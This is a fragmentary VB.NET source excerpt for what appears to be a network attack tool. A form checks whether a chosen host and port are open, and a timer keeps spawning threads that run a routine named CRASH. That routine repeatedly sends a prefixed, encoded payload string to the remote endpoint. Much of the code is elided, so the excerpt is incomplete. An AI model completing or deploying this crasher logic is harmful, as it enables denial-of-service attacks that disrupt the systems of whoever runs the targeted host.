...
Public Class Form1
    ...
    End Sub
    Public Shared NOTY As String = "0"
    ...
    Private Function testSelectedPort(ip As String, port As Integer) As Boolean
        ...
        Try
            ...
            If NOTY = "0" Then
                Dim FormToOpen As New PortNotify
                FormToOpen.Show()
            End If
            testSocket.Close()
            Return True
    ...
    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
        Me.ActiveControl = Label1
        Label16.Text = "Port Status: Checking..."
        Try
            testSelectedPort(Host.Text, Port.Text)


        Catch ex As Exception
            Label16.Text = "Port Status: Invalid."
        End Try
    ...
    Private Sub Timer8_Tick(sender As Object, e As EventArgs) Handles Timer8.Tick
        Dim tt As Object = New Thread(AddressOf OK.CRASH, 1)
        tt.Start()
    End Sub
    ...
    Private Sub CheckBox2_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox2.CheckedChanged
        ...
        If CheckBox2.Checked = True Then
            ...
            NOTY = "0"
            My.Settings.IsNoty = "0"
        Else
            NOTY = "1"
            My.Settings.IsNoty = "1"
        End If
    ...
    Private Sub TextBox8_TextChanged(sender As Object, e As EventArgs) Handles TextBox8.TextChanged
        OK.YYY = TextBox8.Text
    End Sub

    Private Sub Timer9_Tick(sender As Object, e As EventArgs) Handles Timer9.Tick
        Try
            Me.Label14.ForeColor = Color.FromArgb(r, g, b)
...
Public Class OK
    ...
    Public Shared Sub CRASH()
        Try
            ...
            OK.Cn = True
            Dim str2 As String = "kl" & My.Settings.Splitkey
            Dim str3 As String = OK.ENB(YYY)
            OK.Send(str2 + str3)
            OK.Send(str2 + str3)
            OK.Send(str2 + str3)
            OK.Send(str2 + str3)
...
Label_01C1:
    ...
    Public Shared YYY As String = My.Settings.KlStr
End Class